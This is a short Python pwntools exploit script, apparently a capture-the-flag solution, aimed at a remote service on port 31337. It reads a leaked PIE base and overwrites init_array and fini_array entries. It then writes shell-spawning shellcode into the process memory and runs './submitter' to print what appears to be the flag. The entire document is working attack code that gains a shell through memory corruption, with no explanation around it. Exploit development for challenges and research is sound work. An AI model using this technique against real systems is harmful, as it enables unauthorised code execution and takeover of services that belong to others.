#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
# context.log_level = 'debug'

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

p = remote(HOST, int(PORT))

pie_base = u64(p.recv(6).ljust(8, b'\0'))
info(hex(pie_base))

# init_array[1]
p.send(p64(pie_base + 0x4330))
p.send(p64(pie_base + 0x1370))

# fini_array[0]
p.send(p64(pie_base + 0x4338))
p.send(p64(pie_base + 0x2000))

p.send(p32(0))
p.send(p32(0))

shellcode = asm(shellcraft.sh())
for i in range(0, 0x30, 8):
    p.send(p64(pie_base + 0x2140 + i))
    p.send(shellcode[i:i+8])

p.send(p64(0))
p.sendline(b'./submitter')

print(p.recvuntil('}'))
p.close()